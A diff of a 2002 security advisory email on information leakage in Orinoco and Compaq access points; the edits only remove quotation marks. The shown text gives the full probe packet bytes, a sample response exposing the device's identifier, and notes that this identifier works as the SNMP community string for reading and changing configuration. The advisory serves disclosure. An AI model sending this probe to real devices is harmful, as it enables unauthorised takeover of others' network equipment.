@@ -23,7 +23,7 @@ Received: (qmail 24318 invoked from network); 9 Aug 2002 18:57:50 -0000
 X-Mimeole: Produced By Microsoft Exchange V6.0.5762.3
 Content-Class: urn:content-classes:message
 MIME-Version: 1.0
-Content-Type: text/plain; charset="US-ASCII"
+Content-Type: text/plain; charset=US-ASCII
 Date: Fri, 9 Aug 2002 11:12:04 -0700
 Message-Id: <9DC8A3D37E31E043BD516142594BDDFAC476B0@MISSION.foundstone.com>
 X-MS-Has-Attach: 
@@ -31,7 +31,7 @@ X-MS-Tnef-Correlator:
 Thread-Topic: Foundstone Labs Advisory - Information Leakage in Orinoco
     and Compaq Access Points
 Thread-Index: AcI/0CLtBmJ6suMUTl62TDkDlsvtzw==
-From: "Foundstone Labs" <labs@foundstone.com>
+From: Foundstone Labs <labs@foundstone.com>
 To: <da@securityfocus.com>, <vulnwatch@vulnwatch.org>
 Subject: [VulnWatch] Foundstone Labs Advisory - Information Leakage in Orinoco and Compaq Access Points
 Content-Transfer-Encoding: 8bit
@@ -80,14 +80,14 @@ the unique identification value. The identification value can then be
 used as the SNMP community string to view and modify the configuration.
 
 The probe packet:
-"\x01\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
-"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
+\x01\x00\x00\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
 
 Example probe response:
 01 01 00 00 00 00 00 00  00 00 00 00 00 00 00 00  | ................
@@ -99,13 +99,13 @@ Example probe response:
 33 20 53 4e 2d 30 32 55  54 30 38 32 33 32 33 34  | 3 SN-02UT0823234
 32 20 56 00                                       | 2 V.
 
-system.sysName.0 = "ORiNOCO RG-1100 0392a0"
+system.sysName.0 = ORiNOCO RG-1100 0392a0
 Community name: 0392a0
 
 Vendor Response:
 
 Both vendors were notified of this issue on July 8th, 2002. According
-to Orinoco, "The Residential Gateway line has been discontinued."
+to Orinoco, The Residential Gateway line has been discontinued.
 
 Solution:
 
